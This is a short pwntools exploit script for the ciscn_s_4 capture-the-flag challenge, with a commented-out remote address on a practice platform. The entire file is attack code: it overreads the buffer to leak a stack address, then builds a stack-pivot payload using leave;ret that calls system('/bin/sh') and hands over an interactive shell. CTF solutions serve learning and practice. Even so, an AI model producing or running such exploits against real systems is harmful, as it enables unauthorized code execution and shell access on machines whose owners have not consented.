from pwn import *

p = process('./ciscn_s_4')
elf = ELF('ciscn_s_4')
#p = remote('node4.buuoj.cn', 29156)
#gdb.attach(p, 'b *0x80485fd')

leave = 0x80485fd
ret = 0x80485fe
system = elf.plt['system']

#leak stack & write sh
payload = b'a' * 0x28

p.sendafter(b'\n', payload)

p.recvuntil(b', ')
p.recv(0x28)

ebp = u32(p.recv(4)) + ( 0xffcf41a8 - 0xffcf41b8 )

print('[+] ebp -> {}'.format(hex(ebp)))

#stack migrate & call system
payload = p32(system) + b'aaaa' + p32(ebp - 0x28 + 0xc) + b'/bin/sh\x00' + b'\0' * ( 0x28 - 20 ) + p32(ebp - 0x28 - 4) + p32(leave)

p.sendafter(b'\n', payload)

p.interactive()
